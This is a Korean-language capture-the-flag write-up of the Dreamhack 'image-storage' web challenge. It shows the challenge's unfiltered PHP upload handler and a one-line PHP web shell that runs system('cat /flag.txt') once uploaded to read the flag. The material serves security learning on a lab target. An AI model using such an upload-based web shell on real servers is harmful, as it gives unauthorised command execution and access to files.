<!DOCTYPE html>
<html>
<head>
        <link rel="stylesheet" type="text/css" href="sytle.css">
</head>
<body>
        <h1>Dreamhack Web Hacking image-storage Write-Up</h1>
</body>
<br>
<br>
</html>

![image](https://github.com/user-attachments/assets/89916c37-ace3-41ca-b3ce-984ac65c1593)

문제 설명을 보면 php로 작성된 파일이고 ```/flag.txt```에 플래그가 있다고 한다.

문제 서버로 들어가보자

![image](https://github.com/user-attachments/assets/58c1d8d6-79c4-4219-a15f-ac48bf0ef95f)

이미지를 업로드하라고 나온다.

Upload 파일로 들어가면 파일을 업로드할 수 있는 페이지가 나온다.

![image](https://github.com/user-attachments/assets/ce2c012f-f36c-421e-b9cc-3e5daf3eb259)

문제 파일을 다운로드 받아보자.

![image](https://github.com/user-attachments/assets/805a4647-9e2f-4bfc-a26b-e4d644443473)

3개의 php 파일이 들어 있다. 이중에서 upload 파일이 중요한것 같은 먼저 살펴보자.

```python

<?php
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES)) {
      $directory = './uploads/';
      $file = $_FILES["file"];
      $error = $file["error"];
      $name = $file["name"];
      $tmp_name = $file["tmp_name"];
     
      if ( $error > 0 ) {
        echo "Error: " . $error . "<br>";
      }else {
        if (file_exists($directory . $name)) {
          echo $name . " already exists. ";
        }else {
          if(move_uploaded_file($tmp_name, $directory . $name)){
            echo "Stored in: " . $directory . $name;
          }
        }
      }
    }else {
        echo "Error !";
    }
    die();
  }
```

php 명령어 부분만 뜯어 보면 ```./uploads/```경로에 사용자가 올리는 파일이 업로드 되는 것 같다. 

아무런 필터링도 없는 것을 보니 php 코드를 작성해서 업로드할 수 있을 것 같다.

플래그가 ```/flag.txt```에 있는 것을 알고 있으니 ```/flag.txt``` 파일을 출력하도록 코드를 작성했다.

```python
<?php
    system("cat /flag.txt");
?>
```

위 코드로 만든 shell.php 파일을 업로드 했다.

![image](https://github.com/user-attachments/assets/af7a001d-1029-4ed8-81c5-104fc98574ad)

업로드 되었다고 한다. 이어서 업로드한 파일로 들어가 보자.

![image](https://github.com/user-attachments/assets/034ac9b6-f5bf-4899-b46e-1557099bdcdd)

![image](https://github.com/user-attachments/assets/931a5bfe-958b-4a4e-97bb-6abc32e48872)

플래그가 출력되어 있다!!
